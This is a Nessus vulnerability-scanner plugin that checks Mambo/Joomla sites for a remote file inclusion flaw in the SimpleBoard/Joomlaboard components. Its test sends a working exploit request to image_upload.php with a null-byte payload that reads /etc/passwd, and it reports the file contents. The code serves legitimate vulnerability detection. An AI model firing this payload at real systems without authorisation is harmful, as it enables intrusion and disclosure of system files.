#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(22023);
  script_version("$Revision: 1.12 $");
  script_cve_id("CVE-2006-3528", "CVE-2006-5043");
  script_bugtraq_id(18917, 23129);
  script_xref(name:"OSVDB", value:"27421");
  script_xref(name:"OSVDB", value:"28531");

  script_name(english:"SimpleBoard / Joomlaboard Multiple Script sbp Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using SimpleBoard / Joomlaboard");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running SimpleBoard or Joomlaboard, a web-based
bulletin board component for Mambo / Joomla. 

The version of Simpleboard / Joomlaboard installed on the remote host
fails to sanitize user-supplied input to the 'sbp' parameter of the
'file_upload.php' and 'image_upload.php' scripts before using it to
include PHP code.  Provided PHP's 'register_globals' setting is
enabled, an unauthenticated attacker may be able to exploit these
flaws to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/1994" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/3560" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or upgrade to Joomlaboard
version 1.1.2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  foreach com (make_list("com_simpleboard", "com_joomlaboard"))
  {
    r = http_send_recv3(method:"GET", port: port,
      item:string(
        dir, "/components/", com, "/image_upload.php?",
        "sbp=", file ));
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0/sb_helpers\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = res - strstr(res, "<br");
      }

      if (contents)
        report = string(
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = NULL;

      security_warning(port:port, extra:report);
      exit(0);
    }
  }
}
